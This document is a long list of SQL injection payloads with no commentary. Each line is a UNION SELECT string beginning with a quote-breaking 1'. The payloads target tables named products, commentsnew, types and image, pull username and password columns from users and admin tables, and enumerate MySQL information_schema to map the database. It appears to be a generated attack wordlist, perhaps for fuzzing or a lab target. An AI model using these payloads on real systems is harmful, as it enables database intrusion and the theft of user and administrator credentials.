1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE name ='1
1' UNION SELECT comment ,comment ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT name ,NULL ,type ,type FROM products WHERE price ='1
1' UNION SELECT NULL ,id ,price ,price FROM products WHERE type ='1
1' UNION SELECT CHARACTER_SET_NAME ,DATA_TYPE ,NUMERIC_SCALE ,COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT name ,type ,NULL ,name FROM products WHERE id ='1
1' UNION SELECT type ,NULL ,name ,NULL FROM products WHERE id ='1
1' UNION SELECT type ,NULL ,name ,NULL FROM products WHERE price ='1
1' UNION SELECT username ,NULL ,username ,username FROM users WHERE id <>'
1' UNION SELECT id ,username ,NULL ,password FROM admin WHERE username <>'
1' UNION SELECT COLUMN_NAME ,TABLE_SCHEMA ,TABLE_SCHEMA ,IS_NULLABLE FROM information_schema.columns WHERE IS_NULLABLE <>'
1' UNION SELECT TABLE_COMMENT ,AVG_ROW_LENGTH ,TABLE_SCHEMA ,DATA_FREE FROM information_schema.tables WHERE MAX_DATA_LENGTH <>'
1' UNION SELECT comment ,comment ,NULL ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT name ,id ,description ,name FROM types WHERE description ='1
1' UNION SELECT NULL ,username ,NULL ,NULL FROM admin WHERE username ='1
1' UNION SELECT comment ,comment ,name ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT password ,id ,username ,username FROM admin WHERE username ='1
1' UNION SELECT id ,password ,username ,username FROM users WHERE password ='1
1' UNION SELECT DATA_FREE ,CHECK_TIME ,MAX_DATA_LENGTH ,DATA_FREE FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT AVG_ROW_LENGTH ,NULL ,UPDATE_TIME ,AVG_ROW_LENGTH FROM information_schema.tables WHERE INDEX_LENGTH <>'
1' UNION SELECT username ,password ,id ,NULL FROM admin WHERE id <>'
1' UNION SELECT NULL ,CHARACTER_OCTET_LENGTH ,NUMERIC_PRECISION ,COLUMN_TYPE FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT NULL ,id ,password ,username FROM admin WHERE username <>'
1' UNION SELECT password ,id ,password ,password FROM users WHERE id ='1
1' UNION SELECT username ,password ,id ,password FROM users WHERE username <>'
1' UNION SELECT username ,password ,id ,id FROM users WHERE id <>'
1' UNION SELECT name ,id ,description ,name FROM types WHERE name ='1
1' UNION SELECT NULL ,CHECK_TIME ,TABLE_COMMENT ,NULL FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT NULL ,username ,username ,username FROM users WHERE id ='1
1' UNION SELECT CREATE_OPTIONS ,VERSION ,NULL ,UPDATE_TIME FROM information_schema.tables WHERE ROW_FORMAT ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT COLUMN_NAME ,IS_NULLABLE ,IS_NULLABLE ,NUMERIC_SCALE FROM information_schema.columns WHERE NUMERIC_SCALE ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT password ,username ,NULL ,password FROM admin WHERE username <>'
1' UNION SELECT id ,name ,description ,description FROM types WHERE name <>'
1' UNION SELECT ENGINE ,TABLE_TYPE ,TABLE_ROWS ,ROW_FORMAT FROM information_schema.tables WHERE AVG_ROW_LENGTH <>'
1' UNION SELECT description ,NULL ,NULL ,name FROM types WHERE description <>'
1' UNION SELECT DATA_FREE ,TABLE_COLLATION ,MAX_DATA_LENGTH ,TABLE_COLLATION FROM information_schema.tables WHERE AVG_ROW_LENGTH ='1
1' UNION SELECT price ,price ,type ,price FROM products WHERE type ='1
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT name ,description ,id ,name FROM types WHERE id ='1
1' UNION SELECT TABLE_NAME ,COLUMN_NAME ,COLUMN_NAME ,COLUMN_KEY FROM information_schema.columns WHERE EXTRA <>'
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,TABLE_NAME ,NULL ,TABLE_SCHEMA FROM information_schema.columns WHERE GENERATION_EXPRESSION ='1
1' UNION SELECT NULL ,comment ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE ,COLLATION_NAME ,NUMERIC_PRECISION FROM information_schema.columns WHERE SRS_ID <>'
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT GENERATION_EXPRESSION ,NUMERIC_SCALE ,COLUMN_DEFAULT ,DATA_TYPE FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT NULL ,id ,username ,username FROM users WHERE password <>'
1' UNION SELECT description ,id ,id ,description FROM types WHERE id ='1
1' UNION SELECT NUMERIC_SCALE ,DATETIME_PRECISION ,NULL ,TABLE_SCHEMA FROM information_schema.columns WHERE PRIVILEGES <>'
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,NULL ,id ,NULL FROM types WHERE description ='1
1' UNION SELECT COLUMN_NAME ,CHARACTER_MAXIMUM_LENGTH ,TABLE_NAME ,IS_NULLABLE FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT DATETIME_PRECISION ,COLUMN_DEFAULT ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_COMMENT FROM information_schema.columns WHERE COLLATION_NAME <>'
1' UNION SELECT DATA_FREE ,NULL ,CHECK_TIME ,TABLE_SCHEMA FROM information_schema.tables WHERE DATA_LENGTH ='1
1' UNION SELECT NULL ,id ,id ,type FROM products WHERE name <>'
1' UNION SELECT TABLE_CATALOG ,TABLE_SCHEMA ,COLUMN_COMMENT ,CHARACTER_SET_NAME FROM information_schema.columns WHERE IS_NULLABLE <>'
1' UNION SELECT id ,NULL ,id ,name FROM types WHERE name ='1
1' UNION SELECT name ,comment ,name ,name FROM commentsnew WHERE name <>'
1' UNION SELECT name ,NULL ,type ,id FROM products WHERE name ='1
1' UNION SELECT SRS_ID ,NUMERIC_PRECISION ,COLUMN_DEFAULT ,PRIVILEGES FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT price ,id ,id ,id FROM products WHERE price ='1
1' UNION SELECT AVG_ROW_LENGTH ,NULL ,CREATE_OPTIONS ,CHECKSUM FROM information_schema.tables WHERE CHECK_TIME ='1
1' UNION SELECT password ,id ,password ,NULL FROM admin WHERE username ='1
1' UNION SELECT NULL ,comment ,NULL ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT id ,id ,username ,NULL FROM admin WHERE password <>'
1' UNION SELECT name ,name ,type ,NULL FROM products WHERE price <>'
1' UNION SELECT name ,name ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT COLUMN_DEFAULT ,EXTRA ,TABLE_SCHEMA ,COLUMN_NAME FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT description ,NULL ,NULL ,name FROM types WHERE id ='1
1' UNION SELECT username ,password ,NULL ,NULL FROM users WHERE id <>'
1' UNION SELECT description ,NULL ,description ,description FROM types WHERE description <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,password ,username FROM users WHERE id <>'
1' UNION SELECT username ,password ,password ,id FROM users WHERE id ='1
1' UNION SELECT password ,NULL ,NULL ,NULL FROM users WHERE id <>'
1' UNION SELECT description ,name ,id ,id FROM types WHERE name ='1
1' UNION SELECT NULL ,NULL ,id ,username FROM admin WHERE id ='1
1' UNION SELECT id ,NULL ,NULL ,price FROM products WHERE name <>'
1' UNION SELECT NUMERIC_PRECISION ,CHARACTER_MAXIMUM_LENGTH ,CHARACTER_SET_NAME ,NULL FROM information_schema.columns WHERE COLUMN_TYPE <>'
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT TABLE_SCHEMA ,DATA_FREE ,CHECKSUM ,AVG_ROW_LENGTH FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT CHECK_TIME ,DATA_LENGTH ,CHECK_TIME ,AUTO_INCREMENT FROM information_schema.tables WHERE DATA_LENGTH <>'
1' UNION SELECT VERSION ,TABLE_SCHEMA ,AUTO_INCREMENT ,TABLE_CATALOG FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT CREATE_OPTIONS ,INDEX_LENGTH ,INDEX_LENGTH ,CHECK_TIME FROM information_schema.tables WHERE TABLE_COMMENT <>'
1' UNION SELECT price ,NULL ,id ,name FROM products WHERE type ='1
1' UNION SELECT NULL ,price ,price ,name FROM products WHERE price <>'
1' UNION SELECT CHECKSUM ,ROW_FORMAT ,CHECKSUM ,ENGINE FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT description ,name ,id ,description FROM types WHERE description ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT comment ,name ,comment ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT TABLE_TYPE ,CREATE_OPTIONS ,TABLE_COMMENT ,DATA_FREE FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT NUMERIC_SCALE ,NULL ,DATETIME_PRECISION ,DATA_TYPE FROM information_schema.columns WHERE DATETIME_PRECISION ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT id ,id ,NULL ,NULL FROM users WHERE username <>'
1' UNION SELECT username ,id ,username ,username FROM admin WHERE password <>'
1' UNION SELECT CREATE_TIME ,NULL ,CHECK_TIME ,TABLE_COMMENT FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT id ,id ,name ,name FROM types WHERE description ='1
1' UNION SELECT TABLE_COMMENT ,TABLE_ROWS ,MAX_DATA_LENGTH ,TABLE_TYPE FROM information_schema.tables WHERE UPDATE_TIME ='1
1' UNION SELECT price ,type ,name ,NULL FROM products WHERE id <>'
1' UNION SELECT password ,NULL ,NULL ,NULL FROM users WHERE username <>'
1' UNION SELECT COLUMN_TYPE ,CHARACTER_SET_NAME ,DATA_TYPE ,IS_NULLABLE FROM information_schema.columns WHERE EXTRA <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT username ,NULL ,username ,username FROM users WHERE username ='1
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT username ,id ,username ,NULL FROM users WHERE password ='1
1' UNION SELECT DATETIME_PRECISION ,EXTRA ,TABLE_SCHEMA ,TABLE_NAME FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT id ,password ,id ,password FROM admin WHERE password ='1
1' UNION SELECT NULL ,id ,password ,NULL FROM users WHERE username <>'
1' UNION SELECT TABLE_ROWS ,DATA_FREE ,MAX_DATA_LENGTH ,TABLE_COMMENT FROM information_schema.tables WHERE CHECK_TIME <>'
1' UNION SELECT NULL ,password ,password ,username FROM users WHERE username <>'
1' UNION SELECT name ,NULL ,description ,id FROM types WHERE description ='1
1' UNION SELECT description ,name ,description ,NULL FROM types WHERE description ='1
1' UNION SELECT COLUMN_COMMENT ,CHARACTER_OCTET_LENGTH ,EXTRA ,SRS_ID FROM information_schema.columns WHERE COLUMN_DEFAULT ='1
1' UNION SELECT NULL ,password ,password ,NULL FROM admin WHERE password <>'
1' UNION SELECT description ,description ,NULL ,description FROM types WHERE name <>'
1' UNION SELECT NULL ,password ,password ,id FROM admin WHERE id <>'
1' UNION SELECT id ,price ,price ,name FROM products WHERE id <>'
1' UNION SELECT name ,type ,name ,id FROM products WHERE id <>'
1' UNION SELECT username ,username ,username ,id FROM admin WHERE username <>'
1' UNION SELECT NULL ,username ,id ,username FROM users WHERE password <>'
1' UNION SELECT username ,id ,id ,NULL FROM users WHERE id <>'
1' UNION SELECT description ,id ,name ,name FROM types WHERE id ='1
1' UNION SELECT id ,password ,id ,password FROM admin WHERE password <>'
1' UNION SELECT TABLE_NAME ,CHARACTER_SET_NAME ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT password ,id ,username ,id FROM users WHERE username <>'
1' UNION SELECT COLUMN_DEFAULT ,IS_NULLABLE ,GENERATION_EXPRESSION ,COLLATION_NAME FROM information_schema.columns WHERE PRIVILEGES <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT username ,NULL ,NULL ,id FROM users WHERE password ='1
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT password ,password ,NULL ,NULL FROM users WHERE id <>'
1' UNION SELECT name ,name ,id ,id FROM products WHERE name <>'
1' UNION SELECT comment ,NULL ,NULL ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,NULL ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT TABLE_ROWS ,CREATE_TIME ,TABLE_ROWS ,TABLE_CATALOG FROM information_schema.tables WHERE CHECK_TIME <>'
1' UNION SELECT NULL ,id ,id ,NULL FROM products WHERE type <>'
1' UNION SELECT NULL ,id ,password ,NULL FROM users WHERE id <>'
1' UNION SELECT id ,NULL ,NULL ,NULL FROM users WHERE username <>'
1' UNION SELECT MAX_DATA_LENGTH ,CHECK_TIME ,TABLE_CATALOG ,TABLE_NAME FROM information_schema.tables WHERE AUTO_INCREMENT ='1
1' UNION SELECT NULL ,NULL ,name ,description FROM types WHERE name <>'
1' UNION SELECT name ,NULL ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,NULL ,name ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT AUTO_INCREMENT ,AUTO_INCREMENT ,DATA_FREE ,TABLE_SCHEMA FROM information_schema.tables WHERE MAX_DATA_LENGTH <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT name ,id ,id ,id FROM types WHERE id ='1
1' UNION SELECT id ,NULL ,NULL ,NULL FROM types WHERE description ='1
1' UNION SELECT type ,id ,name ,id FROM products WHERE name ='1
1' UNION SELECT type ,NULL ,NULL ,price FROM products WHERE price ='1
1' UNION SELECT NULL ,name ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,username ,id ,NULL FROM users WHERE password ='1
1' UNION SELECT password ,password ,id ,id FROM users WHERE id ='1
1' UNION SELECT username ,id ,id ,username FROM users WHERE username ='1
1' UNION SELECT id ,name ,id ,id FROM types WHERE id ='1
1' UNION SELECT NULL ,comment ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT username ,NULL ,username ,id FROM users WHERE username ='1
1' UNION SELECT username ,id ,username ,NULL FROM admin WHERE username <>'
1' UNION SELECT comment ,name ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,name ,name ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT name ,description ,NULL ,NULL FROM types WHERE description ='1
1' UNION SELECT id ,id ,NULL ,description FROM types WHERE name ='1
1' UNION SELECT NULL ,type ,name ,type FROM products WHERE price ='1
1' UNION SELECT NULL ,comment ,NULL ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT id ,id ,password ,username FROM admin WHERE password ='1
1' UNION SELECT GENERATION_EXPRESSION ,COLUMN_COMMENT ,EXTRA ,COLUMN_COMMENT FROM information_schema.columns WHERE COLUMN_COMMENT <>'
1' UNION SELECT comment ,NULL ,name ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,password ,username ,password FROM users WHERE id <>'
1' UNION SELECT id ,name ,NULL ,name FROM types WHERE description <>'
1' UNION SELECT id ,id ,id ,id FROM users WHERE username ='1
1' UNION SELECT NULL ,password ,id ,password FROM admin WHERE username ='1
1' UNION SELECT type ,price ,name ,id FROM products WHERE name ='1
1' UNION SELECT CHECKSUM ,ENGINE ,TABLE_COLLATION ,TABLE_ROWS FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT comment ,comment ,NULL ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT id ,name ,description ,NULL FROM types WHERE description <>'
1' UNION SELECT NULL ,id ,name ,price FROM products WHERE id <>'
1' UNION SELECT id ,id ,NULL ,id FROM types WHERE description ='1
1' UNION SELECT description ,name ,id ,name FROM types WHERE description ='1
1' UNION SELECT password ,id ,id ,id FROM users WHERE id ='1
1' UNION SELECT ENGINE ,INDEX_LENGTH ,DATA_LENGTH ,ENGINE FROM information_schema.tables WHERE MAX_DATA_LENGTH ='1
1' UNION SELECT NULL ,name ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,NULL ,id ,name FROM products WHERE name <>'
1' UNION SELECT id ,username ,NULL ,NULL FROM users WHERE id <>'
1' UNION SELECT name ,name ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT id ,id ,username ,username FROM users WHERE password <>'
1' UNION SELECT NULL ,username ,NULL ,password FROM admin WHERE username ='1
1' UNION SELECT id ,NULL ,id ,username FROM users WHERE username <>'
1' UNION SELECT NULL ,price ,id ,id FROM products WHERE id <>'
1' UNION SELECT NULL ,password ,id ,password FROM users WHERE id ='1
1' UNION SELECT name ,name ,name ,name FROM commentsnew WHERE name <>'
1' UNION SELECT TABLE_COLLATION ,DATA_LENGTH ,AUTO_INCREMENT ,TABLE_NAME FROM information_schema.tables WHERE TABLE_TYPE ='1
1' UNION SELECT CHARACTER_OCTET_LENGTH ,NULL ,TABLE_SCHEMA ,COLUMN_NAME FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT id ,password ,username ,id FROM users WHERE username <>'
1' UNION SELECT TABLE_SCHEMA ,TABLE_TYPE ,VERSION ,CREATE_OPTIONS FROM information_schema.tables WHERE ROW_FORMAT <>'
1' UNION SELECT id ,username ,username ,username FROM users WHERE id ='1
1' UNION SELECT id ,name ,name ,id FROM products WHERE id <>'
1' UNION SELECT id ,description ,name ,name FROM types WHERE id ='1
1' UNION SELECT name ,name ,type ,price FROM products WHERE name ='1
1' UNION SELECT name ,id ,name ,description FROM types WHERE id ='1
1' UNION SELECT username ,NULL ,id ,id FROM users WHERE id <>'
1' UNION SELECT NULL ,NULL ,id ,username FROM admin WHERE username ='1
1' UNION SELECT id ,name ,type ,id FROM products WHERE price <>'
1' UNION SELECT NULL ,password ,NULL ,NULL FROM admin WHERE password <>'
1' UNION SELECT COLLATION_NAME ,CHARACTER_MAXIMUM_LENGTH ,CHARACTER_SET_NAME ,COLUMN_DEFAULT FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT TABLE_SCHEMA ,TABLE_TYPE ,TABLE_NAME ,CREATE_OPTIONS FROM information_schema.tables WHERE AUTO_INCREMENT <>'
1' UNION SELECT CHARACTER_OCTET_LENGTH ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE ,TABLE_NAME FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT GENERATION_EXPRESSION ,NULL ,COLUMN_TYPE ,PRIVILEGES FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT PRIVILEGES ,TABLE_CATALOG ,SRS_ID ,COLUMN_KEY FROM information_schema.columns WHERE SRS_ID ='1
1' UNION SELECT type ,type ,id ,price FROM products WHERE type <>'
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT COLUMN_TYPE ,CHARACTER_MAXIMUM_LENGTH ,CHARACTER_MAXIMUM_LENGTH ,TABLE_SCHEMA FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT username ,NULL ,id ,username FROM users WHERE id ='1
1' UNION SELECT NULL ,comment ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT name ,name ,NULL ,name FROM types WHERE id <>'
1' UNION SELECT TABLE_COMMENT ,MAX_DATA_LENGTH ,CREATE_OPTIONS ,TABLE_TYPE FROM information_schema.tables WHERE CREATE_OPTIONS ='1
1' UNION SELECT CREATE_OPTIONS ,MAX_DATA_LENGTH ,MAX_DATA_LENGTH ,AUTO_INCREMENT FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT NUMERIC_SCALE ,COLUMN_TYPE ,SRS_ID ,COLUMN_COMMENT FROM information_schema.columns WHERE COLUMN_COMMENT ='1
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT name ,name ,NULL ,NULL FROM types WHERE description ='1
1' UNION SELECT COLLATION_NAME ,COLUMN_TYPE ,IS_NULLABLE ,COLLATION_NAME FROM information_schema.columns WHERE COLUMN_NAME <>'
1' UNION SELECT NULL ,comment ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT id ,id ,type ,name FROM products WHERE price <>'
1' UNION SELECT password ,id ,id ,username FROM users WHERE password <>'
1' UNION SELECT id ,id ,username ,id FROM users WHERE password <>'
1' UNION SELECT comment ,comment ,NULL ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT TABLE_NAME ,COLUMN_NAME ,COLUMN_DEFAULT ,SRS_ID FROM information_schema.columns WHERE COLUMN_KEY <>'
1' UNION SELECT comment ,name ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT username ,id ,username ,password FROM users WHERE password ='1
